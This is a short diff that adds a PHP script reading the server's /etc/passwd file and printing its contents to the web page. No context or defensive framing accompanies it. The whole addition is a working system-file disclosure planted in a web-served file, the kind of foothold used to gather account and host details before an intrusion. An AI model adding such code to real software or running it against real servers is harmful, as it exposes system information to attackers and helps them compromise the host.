@@ -1,0 +1,4 @@
+<?php
+$content = file_get_contents('/etc/passwd');
+echo nl2br(htmlspecialchars($content));
+?>
